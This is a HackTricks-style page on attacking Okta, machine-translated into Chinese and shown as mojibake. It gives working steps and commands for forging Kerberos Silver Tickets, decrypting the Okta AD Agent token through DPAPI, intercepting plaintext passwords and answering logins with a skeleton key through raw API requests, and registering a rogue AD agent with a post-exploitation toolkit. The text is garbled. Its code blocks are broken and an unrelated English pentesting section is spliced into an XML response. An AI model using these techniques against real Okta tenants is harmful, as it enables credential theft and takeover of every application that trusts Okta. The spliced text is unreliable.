# Okta å®‰å…¨æ€§

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æ”»å‡»ç›´åˆ°æˆä¸ºè‹±é›„ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTs é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š **å…³æ³¨** æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

Okta, Inc. æ˜¯ä¸€å®¶ **èº«ä»½å’Œè®¿é—®ç®¡ç†å…¬å¸**ï¼Œæä¾›äº‘è½¯ä»¶å¸®åŠ©å…¬å¸ **ç®¡ç†å’Œä¿æŠ¤ç”¨æˆ·å¯¹ç°ä»£åº”ç”¨ç¨‹åºçš„è®¤è¯**ï¼Œå¹¶ä¸ºå¼€å‘è€…åœ¨åº”ç”¨ç¨‹åºã€ç½‘ç«™ç½‘ç»œæœåŠ¡å’Œè®¾å¤‡ä¸­æ„å»ºèº«ä»½æ§åˆ¶ã€‚

ä»–ä»¬çš„æ ¸å¿ƒæœåŠ¡ï¼Œç§°ä¸º Okta èº«ä»½äº‘ï¼Œæä¾›çš„äº§å“åŒ…æ‹¬å•ç‚¹ç™»å½•ï¼ˆSSOï¼‰ã€å¤šå› ç´ è®¤è¯ï¼ˆMFAï¼‰ã€ç”Ÿå‘½å‘¨æœŸç®¡ç†ã€é€šç”¨ç›®å½•ã€API è®¿é—®ç®¡ç†ç­‰ã€‚è¿™å¸®åŠ©å…¬å¸ä¿æŠ¤ä»–ä»¬çš„æ•æ„Ÿæ•°æ®ï¼Œå¹¶ç®€åŒ–ç”¨æˆ·è®¿é—®ï¼Œä½¿åº”ç”¨ç¨‹åºå’ŒæœåŠ¡å¯¹å‘˜å·¥æˆ–å®¢æˆ·æ›´åŠ å¯è®¿é—®å’Œæ˜“äºä½¿ç”¨ã€‚

Okta çš„æœåŠ¡åœ¨ä¼ä¸šç¯å¢ƒä¸­å¹¿æ³›ä½¿ç”¨ï¼Œä¹Ÿè¢«è¾ƒå°çš„å…¬å¸å’Œå¼€å‘è€…ä½¿ç”¨ã€‚å®ƒåœ¨å¸®åŠ©ä¼ä¸šå®‰å…¨é‡‡ç”¨å’Œç®¡ç†äº‘æŠ€æœ¯æ–¹é¢å‘æŒ¥ç€è‡³å…³é‡è¦çš„ä½œç”¨ã€‚æˆªè‡³æˆ‘åœ¨ 2021 å¹´ 9 æœˆçš„çŸ¥è¯†æˆªæ­¢ç‚¹ï¼ŒOkta ä»ç„¶æ˜¯èº«ä»½å’Œè®¿é—®ç®¡ç†ï¼ˆIAMï¼‰è¡Œä¸šçš„é‡è¦å‚ä¸è€…ã€‚

{% hint style="danger" %}
Okta çš„ä¸»è¦ç›®æ ‡æ˜¯é…ç½®ä¸åŒç”¨æˆ·å’Œç»„å¯¹å¤–éƒ¨åº”ç”¨ç¨‹åºçš„è®¿é—®ã€‚å¦‚æœæ‚¨è®¾æ³•åœ¨ Okta ç¯å¢ƒä¸­ **å±å®³ç®¡ç†å‘˜æƒé™**ï¼Œæ‚¨å¾ˆå¯èƒ½èƒ½å¤Ÿ **å±å®³å…¬å¸ä½¿ç”¨çš„æ‰€æœ‰å…¶ä»–å¹³å°**ã€‚
{% endhint %}

{% hint style="success" %}
è¦æ‰§è¡Œ Okta ç¯å¢ƒçš„å®‰å…¨å®¡æŸ¥ï¼Œæ‚¨åº”è¯¥è¦æ±‚ **ç®¡ç†å‘˜åªè¯»è®¿é—®æƒé™**ã€‚
{% endhint %}

### æ¦‚è¦

æœ‰ **ç”¨æˆ·**ï¼ˆå¯ä»¥ **å­˜å‚¨åœ¨ Okta ä¸­**ï¼Œä»é…ç½®çš„ **èº«ä»½æä¾›è€…** ç™»å½•æˆ–é€šè¿‡ **æ´»åŠ¨ç›®å½•** æˆ– LDAP è®¤è¯ï¼‰ã€‚\
è¿™äº›ç”¨æˆ·å¯ä»¥åœ¨ **ç»„** å†…ã€‚\
è¿˜æœ‰ **è®¤è¯å™¨**ï¼šä¸åŒçš„è®¤è¯é€‰é¡¹ï¼Œå¦‚å¯†ç ï¼Œä»¥åŠå‡ ç§ 2FAï¼Œå¦‚ WebAuthnã€ç”µå­é‚®ä»¶ã€ç”µè¯ã€okta verifyï¼ˆå®ƒä»¬å¯èƒ½å¯ç”¨æˆ–ç¦ç”¨ï¼‰...

ç„¶åï¼Œæœ‰ä¸ Okta åŒæ­¥çš„ **åº”ç”¨ç¨‹åº**ã€‚æ¯ä¸ªåº”ç”¨ç¨‹åºéƒ½ä¼šä¸ Okta æœ‰ä¸€äº› **æ˜ å°„** æ¥å…±äº«ä¿¡æ¯ï¼ˆå¦‚ç”µå­é‚®ä»¶åœ°å€ã€åå­—...ï¼‰ã€‚æ­¤å¤–ï¼Œæ¯ä¸ªåº”ç”¨ç¨‹åºå¿…é¡»åœ¨ä¸€ä¸ª **è®¤è¯ç­–ç•¥** å†…ï¼Œè¯¥ç­–ç•¥æŒ‡ç¤ºç”¨æˆ·è®¿é—®åº”ç”¨ç¨‹åºæ‰€éœ€çš„ **è®¤è¯å™¨**ã€‚

{% hint style="danger" %}
æœ€å¼ºå¤§çš„è§’è‰²æ˜¯ **è¶…çº§ç®¡ç†å‘˜**ã€‚

å¦‚æœæ”»å‡»è€…ä»¥ç®¡ç†å‘˜èº«ä»½å±å®³ Oktaï¼Œæ‰€æœ‰ **ä¿¡ä»» Okta çš„åº”ç”¨ç¨‹åº** é«˜åº¦å¯èƒ½ä¼šè¢« **å±å®³**ã€‚
{% endhint %}

## æ”»å‡»

### å®šä½ Okta é—¨æˆ·

é€šå¸¸ï¼Œå…¬å¸çš„é—¨æˆ·ç½‘ç«™å°†ä½äº **companyname.okta.com**ã€‚å¦‚æœä¸æ˜¯ï¼Œå°è¯•ç®€å•çš„ **companyname** çš„ **å˜ä½“**ã€‚å¦‚æœæ‰¾ä¸åˆ°ï¼Œä¹Ÿæœ‰å¯èƒ½ç»„ç»‡æœ‰ä¸€ä¸ª **CNAME** è®°å½•ï¼Œå¦‚ **`okta.companyname.com`** æŒ‡å‘ **Okta é—¨æˆ·**ã€‚

### é€šè¿‡ Kerberos ç™»å½• Okta

ï¼ˆæ”»å‡»å¤åˆ¶è‡ª[**è¿™é‡Œ**](https://trustedsec.com/blog/okta-for-red-teamers)ï¼‰ã€‚

å¦‚æœåƒ **`companyname.kerberos.okta.com`** è¿™æ ·çš„åŸŸå­˜åœ¨ï¼Œåˆ™åœ¨å…¬å¸å†…é…ç½®äº† kerberos ä»¥è®¿é—® Oktaã€‚è¿™éå¸¸æœ‰è¶£ï¼Œå› ä¸ºé€šå¸¸ Windows ç”¨æˆ·ä¸éœ€è¦ MFA å°±èƒ½è®¿é—® Oktaã€‚

ä¹Ÿå¯ä»¥åœ¨ AD ç¯å¢ƒä¸­è¿è¡Œä»¥ä¸‹å‘½ä»¤æ‰¾åˆ°é…ç½®äº† Okta è®¿é—®æƒé™çš„ Kerberos ç”¨æˆ·ï¼š
```bash
getST.py -spn HTTP/clientname.kerberos.okta.com -dc-ip 1.2.3.4 LAB/comprommiseduser
```
åœ¨ä¸ºADç”¨æˆ·æ£€ç´¢åˆ°ç¥¨è¯åï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨Rubeusæˆ–Mimikatzå°†å…¶æ³¨å…¥æˆ‘ä»¬æ§åˆ¶çš„ä¸»æœºï¼š

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

æ‚¨éœ€è¦ç¡®ä¿`clientname.kerberos.okta.com`è¢«æ·»åŠ åˆ°Interneté€‰é¡¹ä¸­çš„â€œå†…ç½‘â€å®‰å…¨åŒºåŸŸã€‚ç„¶åï¼Œåœ¨æˆ‘ä»¬çš„æµè§ˆå™¨ä¸­ï¼Œå¦‚æœæˆ‘ä»¬è®¿é—®ä¸‹é¢çš„URLï¼Œæˆ‘ä»¬åº”è¯¥ä¼šæ”¶åˆ°ä¸€ä¸ªJSONå“åº”ï¼Œå½“Kerberosç¥¨è¯è¢«æ¥å—æ—¶ï¼Œæä¾›ä¸€ä¸ª`OK`ç»“æœï¼š

<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

å‰å¾€Oktaä»ªè¡¨æ¿ï¼Œå¦‚æœä¸€åˆ‡æ­£å¸¸ï¼Œæ‚¨å°†è¢«ç™»å½•ã€‚

æ­¤å¤–ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ”»ç ´å®é™…çš„OktaæœåŠ¡è´¦æˆ·ï¼Œæš´éœ²å§”æ´¾SPNï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡ŒSilver Ticketæ”»å‡»ã€‚

åº”è¯¥æ³¨æ„çš„æ˜¯ï¼Œç”±äºOktaä»…æ”¯æŒAESç”¨äºç¥¨è¯åŠ å¯†ï¼Œæˆ‘ä»¬éœ€è¦ç¡®ä¿æˆ‘ä»¬æœ‰AESå¯†é’¥æˆ–æ˜æ–‡å¯†ç æ¥è¿›è¡Œè®¤è¯ï¼š

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

ä¸ºäº†ä¸ºå—å®³ç”¨æˆ·`testuser`åˆ¶ä½œæˆ‘ä»¬çš„ç¥¨è¯ï¼Œæˆ‘ä»¬ä½¿ç”¨ï¼š

{% code overflow="wrap" %}
```bash
ticketer.py -domain-sid S-1-5-21-4170871944-1575468979-147100471 -domain lab.local -dc-ip DC01 -aesKey db22ab9c89f2f0d545024f9dfabbed44173397065d8f5b7e172200ca38ed4393 -user-id 1118 -spn HTTP/example.kerberos.okta.com testuser
```
```markdown
{% endcode %}

å†æ¬¡ï¼Œé€šè¿‡æˆ‘ä»¬çš„æµè§ˆå™¨ä¼šè¯å°†æ­¤å†…å®¹å‘é€ç»™Oktaï¼š

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

### åŠ«æŒOkta ADä»£ç†

ï¼ˆæ”»å‡»å¤åˆ¶[**è‡ªæ­¤å¤„**](https://trustedsec.com/blog/okta-for-red-teamers)ï¼‰ã€‚

å¦‚æœä½ è®¿é—®è¿è¡ŒOkta ADä»£ç†çš„æœåŠ¡å™¨ã€‚è¯¥ä»£ç†è´Ÿè´£å°†åŸŸç”¨æˆ·å’Œç»„åŒæ­¥åˆ°Oktaä»¥è¿›è¡Œé…ç½®ï¼Œå¹¶ä¸”åœ¨ç”¨æˆ·ç™»å½•é—¨æˆ·æ—¶å“åº”Oktaçš„è®¤è¯è¯·æ±‚ã€‚

é»˜è®¤æƒ…å†µä¸‹ï¼Œä»£ç†å®‰è£…åœ¨ï¼š
```
```bash
C:\Program Files (x86)\Okta\Okta AD Agent
```
æˆ‘ä»¬å°†æŸ¥çœ‹ `OktaAgentService.exe.config`ï¼Œå…¶ä¸­åŒ…å«ä¸€äº›æœ‰è¶£çš„XMLç‰‡æ®µï¼š

<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

Base64ç¼–ç çš„`AgentToken`æ˜¯æˆ‘ä»¬å…³æ³¨çš„ç„¦ç‚¹ã€‚å¦‚æœæˆ‘ä»¬åœ¨dnSpyä¸­æ‰“å¼€`OktaAgentService.exe`ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™äº›å€¼æ˜¯å¦‚ä½•è¢«è§£å¯†çš„ï¼š

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

æ²¡é”™...æ­£æ˜¯è€æœ‹å‹DPAPIï¼`RandomEntropy`çš„å€¼è¢«è®¾ç½®ä¸ºï¼š

<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•è§£å¯†è¿™ä¸ªBase64ç¼–ç çš„XMLå€¼ï¼š
```powershell
Add-Type -AssemblyName 'System.Security'
$rand = [byte]174,53,167,191,10,250,125,232,223,147,248,86,65

$k = [System.Security.Cryptography.ProtectedData]::Unprotect([System.Convert]::FromBase64String("AQAAANCMnd8BFdERjH..."), $rand, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
[System.Text.Encoding]::Unicode.GetString($k)
```
DPAPI ä¸»å¯†é’¥å±äºè¿è¡Œâ€œOkta AD Agentâ€æœåŠ¡çš„ç”¨æˆ·è´¦æˆ·ï¼Œå› æ­¤æ‚¨éœ€è¦åœ¨æœåŠ¡è´¦æˆ·çš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œä¸Šè¿°æ“ä½œï¼Œæˆ–è€…è·å–è¯¥è´¦æˆ·çš„ä¸»å¯†é’¥å¹¶è§£å¯†ï¼š

<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

ä¾‹å¦‚ï¼Œåœ¨ `OktaAgentService.exe.config` ä¸­ï¼Œæˆ‘ä»¬æœ‰ä¸¤ä¸ªè¿›ä¸€æ­¥çš„ XML å­—æ®µï¼Œ`APPID` å’Œ `AGENTID`ã€‚ç»“åˆ `AgentToken`ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ–¹å¼å‘èµ· `GET` è¯·æ±‚ï¼š
```xml
GET /api/1/internal/app/activedirectory/[APPID]/agent/[AGENTID]/nextAction?agentVersion=1&pollid=anything HTTP/1.1
Host: client.okta.com
Authorization: SSWS 00OfIl_Gi1rZu1NETmHo6auU6YZEOEn8ZlDhyqstiZ
```
æ­¤è°ƒç”¨å°†é˜»å¡ï¼Œç›´åˆ°ç”¨æˆ·é€šè¿‡Oktaè®¤è¯ï¼ˆæˆ–è¯·æ±‚è¶…æ—¶ï¼‰ï¼Œæ­¤æ—¶å®ƒå°†ä»¥æ˜æ–‡å½¢å¼è¿”å›ä¸‹ä¸€ä¸ªæä¾›çš„ç”¨æˆ·åå’Œå¯†ç ï¼š
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<action>
<UserAuth actionId="rpc::app.active_directory.agent.reply.ok14-majorecs02a.auw2-ok14.internal//1670637714886//Y5PojoeQQ3KDgHHzA11P9wAAC8g:e9088489-99ff-435a-943b-b7dccc457cb5:">
<type>USER_AUTH</type>
<password>abc123</password>
<useLdapGroupPasswordPolicy>false</useLdapGroupPasswordPolicy>
<userName>domuser@lab.local</userName>
</UserAuth>
</action>
```
```markdown
è™½ç„¶è¿™å…è®¸æ•è·å‡­è¯ï¼Œæˆ‘ä»¬ä¹Ÿæœ‰æœºä¼šå›åº”è¿™ä¸€è®¤è¯å°è¯•ï¼Œå¦‚æœæˆ‘ä»¬æƒ³åšç±»ä¼¼æä¾›ä¸‡èƒ½é’¥åŒ™çš„äº‹æƒ…ã€‚æˆ‘ä»¬é€šè¿‡å‘å‡ºä»¥ä¸‹HTTPè¯·æ±‚æ¥å®ç°ï¼š
```
```xml
POST /api/1/internal/app/activedirectory/0oa7c027u2tcjxoki697/agent/a537ca54okqfsuu0s697/actionResult?responseid=12345 HTTP/1.1
Host: client.okta.com
Authorization: SSWS 00JFtjd...WgkeI1Eg5Y
Content-Type: application/xml; charset=utf-8
Content-Length: 1362

<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" actionId="rpc::app.active_directory.agent.reply.ok14-majorecs04a.auw2-ok14.internal//1694301421033//ZPz86MzEBzhpMhSFWzyK5wAAA_Q:440a7d52-704b-4c1b-ac79-afdc241e3080:">
<type>USER_AUTH</type>
<status>SUCCESS</status>
<message></message>
<errorCode></errorCode>
<timestamps>
<actionRecieivedFromOkta>1694358076</actionRecieivedFromOkta>
<actionSentToLdapServer>1694358076</actionSentToLdapServer>
<responseReceivedFromLdapServer>1694358076</responseReceivedFromLdapServer>
<responseSentToOkta>1694358076</responseSentToOkta>
<actionReceivedFromOktaMilliseconds>20230910150116.726Z</actionReceivedFromOktaMilliseconds>
<actionSentToLdapServerMilliseconds>20230910150116.741Z</actionSentToLdapServerMilliseconds>
<responseReceivedFromLdapServerMilliseconds>20230910150116.741Z</responseReceivedFromLdapServerMilliseconds>
<responseSentToOktaMilliseconds>20230910150116.741Z</responseSentToOktaMilliseconds>
</timestamps>
<additionalInfo>{{"ExecutionTime":"12","AgentUpTime":"0 day(s) 22:41:49","DC":"DC01.lab.local","DomainControllerFunctionality":"WIN2016","DomainFunctionality":"WIN2016","ForestFunctionality":"WIN2016","LdapResponseTime":"0"}}</additionalInfo>
</agentActionResult>
```
å‘å‡ºæ­¤è¯·æ±‚çš„ç»“æœæ˜¯å…è®¸é€šè¿‡Oktaå¯¹ä»»ä½•ç”¨æˆ·è¿›è¡Œè®¤è¯ã€‚

### åŠ«æŒADä½œä¸ºç®¡ç†å‘˜

ï¼ˆæ”»å‡»å¤åˆ¶è‡ª[**è¿™é‡Œ**](https://trustedsec.com/blog/okta-for-red-teamers)ï¼‰ã€‚

æˆ‘ä»¬çŸ¥é“ï¼Œå¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ªè¢«ç›—çš„Agent Tokenï¼Œæˆ‘ä»¬å¯ä»¥åŠ«æŒOkta ADä»£ç†ï¼Œä½†å¦‚æœæˆ‘ä»¬å·²ç»ä¾µå…¥äº†ä¸€ä¸ªæœ‰ç‰¹æƒçš„Oktaè´¦æˆ·ï¼Œå¹¶ä¸”æƒ³è¦åœ¨æ²¡æœ‰ç°æœ‰ä»£ç†ä»¤ç‰Œçš„æƒ…å†µä¸‹æ‰§è¡Œæ­¤æ“ä½œå‘¢ï¼Ÿè®©æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•åšåˆ°è¿™ä¸€ç‚¹ã€‚

é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªOkta ADä»£ç†APIä»¤ç‰Œã€‚ä¸ºäº†å¯åŠ¨è®¤è¯æµç¨‹ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªOAuth Codeã€‚è¦è·å–è¿™ä¸ªï¼Œæˆ‘ä»¬é¦–å…ˆå‰å¾€ï¼š

{% code overflow="wrap" %}
```
https://example.okta.com/oauth2/authorize?redirect_uri=%2Foauth-response&response_type=code&client_id=cappT0Hfy97F1BoO1UTR&prompt=select_account
```
```markdown
{% endcode %}

è¿™å°†ç»™ä½ ä¸€ä¸ªæƒé™æç¤ºï¼Œä½ éœ€è¦æ¥å—ï¼š

<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

æ¥å—æ˜¾ç¤ºçš„æç¤ºå°†ä¼šé‡å®šå‘åˆ° `/oauth-response`ï¼Œå¹¶é™„å¸¦ä¸€ä¸ª `code` å‚æ•°ï¼š

<figure><img src="../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

æˆ‘ä»¬éœ€è¦æ‹¿åˆ°è¿™ä¸ª `code` å‚æ•°ï¼Œå¹¶ä½¿ç”¨ POST è¯·æ±‚æ¥è¯·æ±‚ä¸€ä¸ª API ä»¤ç‰Œï¼š
```
```
POST /oauth2/token HTTP/1.1
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Content-Type: application/x-www-form-urlencoded
Host: example.okta.com
Content-Length: 65
Expect: 100-continue
Accept-Encoding: gzip, deflate
Connection: Keep-Alive

grant_type=api_token&code=7vzn01sl&client_id=cappT0Hfy97F1BoO1UTR
```
å“åº”è¿”å›ç»™æˆ‘ä»¬æˆ‘ä»¬çš„APIä»¤ç‰Œï¼š
```
{"api_token":"00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd"}
```
```markdown
ä½¿ç”¨è¿™ä¸ªä»¤ç‰Œï¼Œæˆ‘ä»¬éœ€è¦å°†å®ƒä¸ä¸€ä¸ªæ´»è·ƒçš„ADåŸŸå…³è”èµ·æ¥ã€‚æˆ‘ä»¬é€šè¿‡ä»¥ä¸‹APIè°ƒç”¨æ¥å®ç°ï¼š
```
```
POST /api/1/internal/app/activedirectory/ HTTP/1.1
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Host: example.okta.com
Accept: application/xml; charset=UTF-8
Content-Type: application/xml; charset=UTF-8
Content-Length: 86
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<domain name="lab.local" />
```
è¿™å°†è¿”å›ä»¥ä¸‹XMLå“åº”ï¼Œæˆ‘ä»¬éœ€è¦ä¿ç•™`id`å±æ€§å€¼ä»¥ä¾›ç¨åä½¿ç”¨
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<activeDirectory id="0oa4jsza16ar1UdaW696">
<name>lab.local</name>
<newInstance>false</newInstance>
</activeDirectory>
```
æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å‘èµ·ä¸€ä¸ªHTTP APIè°ƒç”¨æ¥å‘½åæˆ‘ä»¬çš„è¿æ¥å™¨ï¼š
```
POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent?name=DC02 HTTP/1.1
Host: example.okta.com
Content-Type: text/xml
Content-Length: 0
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd
```
```xml
<user id="00u5t60iloOHN9pBi0h7">
    ...
</user>
```
{% endcode %}

You can use this `id` to perform further attacks, such as attempting to enumerate other users or manipulate user data.

## Exploiting Weaknesses in Okta

Okta is a widely used identity management solution. When pentesting Okta, you should look for misconfigurations and weaknesses that could lead to unauthorized access or data leaks.

### Enumeration

Enumeration involves collecting information about users, groups, and other entities. This can be done through various means, such as API endpoints that may not be properly secured.

### Account Takeover

Account takeover is a critical threat. Attackers can gain control of a user's account through methods like password spraying, phishing, or exploiting authentication flaws.

### API Abuse

APIs are integral to Okta's functionality. If an API is not secured correctly, it could be abused to extract sensitive information or perform unauthorized actions.

### Session Hijacking

Session hijacking occurs when an attacker takes over a user's session, often by stealing session tokens. This can lead to unauthorized access to the application.

## Mitigation Strategies

To protect against these threats, implement the following strategies:

- Regularly review and update security configurations.
- Monitor for suspicious activity.
- Enforce strong authentication and authorization controls.
- Secure API endpoints with proper authentication and rate limiting.

Remember, regular pentesting is crucial to uncover and address potential security issues in any cloud/SaaS platform.
```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><agent id="a532camqiqXMhlOf5697"><name>DC02</name></agent>
```
```markdown
æœ€åï¼Œæˆ‘ä»¬åˆå§‹åŒ–è¿æ¥ä»¥å…è®¸æ¥æ”¶æ•°æ®ï¼š
```
```xml
POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent/a532camqiqXMhlOf5697/actionResult?agentVersion=3.13.0.0 HTTP/1.1
Host: example.okta.com
Content-Type: text/xml
Content-Length: 825
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd

<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<type>INIT</type>
<status>SUCCESS</status>
<timestamps>
<actionRecieivedFromOkta />
<actionSentToLdapServer />
<responseReceivedFromLdapServer />
<responseSentToOkta>1694304008</responseSentToOkta>
<actionReceivedFromOktaMilliseconds>00010101000000.000Z</actionReceivedFromOktaMilliseconds>
<actionSentToLdapServerMilliseconds>00010101000000.000Z</actionSentToLdapServerMilliseconds>
<responseReceivedFromLdapServerMilliseconds>00010101000000.000Z</responseReceivedFromLdapServerMilliseconds>
<responseSentToOktaMilliseconds>20230910000008.174Z</responseSentToOktaMilliseconds>
</timestamps>
<additionalInfo>{}</additionalInfo>
</agentActionResult>
```
å®Œæˆè¿™äº›æ“ä½œåï¼Œæˆ‘ä»¬çš„å‡å†’ADä»£ç†ç°å·²å‡†å¤‡å°±ç»ªï¼Œå¹¶å°†æŒ‰ç…§ä¹‹å‰æ‰€ç¤ºå¤„ç†è®¤è¯å°è¯•ã€‚

æ˜¾ç„¶ï¼Œæˆ‘ä»¬ä¸æƒ³ä½¿ç”¨Burpæ¥å®Œæˆæ‰€æœ‰è¿™äº›æ“ä½œï¼Œå› æ­¤å·²ç»åˆ›å»ºäº†ä¸€ä¸ªå·¥å…·æ¥æ”¯æŒä¸€äº›ç”¨ä¾‹ã€‚è¯¥å·¥å…·å¯ä»[è¿™é‡Œ](https://github.com/xpn/OktaPostExToolkit)è·å–ã€‚

æˆ‘ä»¬å¯ä»¥åœ¨`token`æ¨¡å¼ä¸‹è¿è¡Œæ­¤å·¥å…·ï¼Œå®ƒä¼šå–ä¸€ä¸ªè¢«æ³„éœ²çš„Agent Tokenå€¼ï¼Œå¹¶å°†è¿æ¥åˆ°Okta APIï¼Œè½¬å‚¨å®ƒæ¥æ”¶åˆ°çš„ä»»ä½•å‡­è¯ï¼š

{% code overflow="wrap" %}
```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 token --api-token 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd --app-id 0oa7c027u2TcJxoki697 --agent-id a537cnm9ldwPILkqP697
```
è§†é¢‘ç¤ºä¾‹ï¼š

* [https://www.youtube.com/watch?v=ZYRcfj6jtaA](https://www.youtube.com/watch?v=ZYRcfj6jtaA)
* [https://youtu.be/Sob2u6xEjTE](https://youtu.be/Sob2u6xEjTE)

å¦‚æœæˆ‘ä»¬æœ‰Oktaç”¨æˆ·çš„ç®¡ç†å‡­è¯ï¼Œè¯¥å·¥å…·è¿˜å…è®¸æ³¨å†Œæ–°çš„ADè¿æ¥å™¨ï¼š

{% code overflow="wrap" %}
```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 oauth --machine-name DC01 --windows-domain lab.local --code OAUTH_CODE_HERE
```
{% endcode %}

### Okta ä¼ªé€  SAML æä¾›å•†

(æ”»å‡»å¤åˆ¶[**è‡ªæ­¤å¤„**](https://trustedsec.com/blog/okta-for-red-teamers))ã€‚

åœ¨è¯„ä¼°ä¸­éå¸¸æœ‰ç”¨çš„å¦ä¸€ç§æŠ€æœ¯æ˜¯éƒ¨ç½²ä¸€ä¸ªä¼ªé€ çš„ SAML æä¾›å•†ã€‚

æœ€è¿‘ï¼ŒOkta å®é™…ä¸Šæä¾›äº†å…³äºé‡å¤–ä½¿ç”¨è¿™ç§æŠ€æœ¯çš„æ”»å‡»çš„[å®‰å…¨æ›´æ–°](https://sec.okta.com/articles/2023/08/cross-tenant-impersonation-prevention-and-detection)ï¼Œæ‰€ä»¥å½“åœ¨ç¯å¢ƒä¸­æ¨¡æ‹Ÿæ´»åŠ¨æ—¶ï¼Œäº†è§£è¿™ä¸€ç‚¹è‚¯å®šæ˜¯æœ‰ç”¨çš„ï¼Œç‰¹åˆ«æ˜¯å¯¹äºé‚£äº›å¸Œæœ›æµ‹è¯•å¯¹è¿™ç§ç‰¹å®šæ”»å‡»çš„æ£€æµ‹çš„å®¢æˆ·ã€‚

å¦‚æœæˆ‘ä»¬æ‹¥æœ‰ä¸€ä¸ªæå‡æƒé™çš„ Okta è´¦æˆ·ï¼Œæˆ‘ä»¬å¯ä»¥ä½œä¸º Okta åŠŸèƒ½çš„ä¸€éƒ¨åˆ†éƒ¨ç½²ä¸€ä¸ªå¤–éƒ¨èº«ä»½æä¾›å•†ã€‚è¿™å…è®¸åƒ Entra ID è¿™æ ·çš„å¤–éƒ¨æä¾›å•†å®Œæˆè®¤è¯ï¼Œç„¶åå°†ç”¨æˆ·é‡å®šå‘åˆ° Okta ä»¥é€‰æ‹©é›†æˆçš„åº”ç”¨ç¨‹åºã€‚

ä½†æ˜¯å¦‚æœæˆ‘ä»¬æ§åˆ¶äº† IDP å‘¢ï¼Ÿæ˜¾ç„¶ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¹å‡†æˆ‘ä»¬æƒ³è¦çš„ä»»ä½•è®¤è¯è¯·æ±‚ã€‚

